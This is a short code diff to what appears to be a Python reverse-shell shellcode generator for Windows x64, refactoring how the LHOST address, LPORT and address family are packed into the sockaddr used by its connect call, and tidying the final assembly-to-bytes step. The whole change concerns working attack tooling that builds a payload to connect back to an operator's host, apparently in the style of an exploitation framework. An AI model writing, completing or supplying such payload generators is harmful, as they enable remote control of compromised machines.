@@ -248,6 +248,10 @@ get_{imports[func]}:
             lport = int(argv_dict["LPORT"])
 
 
+        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
+        sin_port = struct.pack('<H', lport).hex()
+        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+
         shellcode = f"""
 _start:
     push rbp
@@ -282,7 +286,7 @@ call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
     lea rdx, [rbp - {self.storage_offsets['name']}]
-    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
+    mov r9, {sin_addr}{sin_port}{sin_family}
     mov [rdx], r9
     xor r9, r9
     mov [rdx + 0x8], r9
@@ -350,7 +354,7 @@ fin:
         """
 
         generator = Assembler(Shellcode.arch)
-        source_code = self.generate_source()
-        shellcode = generator.get_bytes_from_asm(source_code)
 
-        return shellcode
+        src = self.generate_source()
+
+        return generator.get_bytes_from_asm(src)
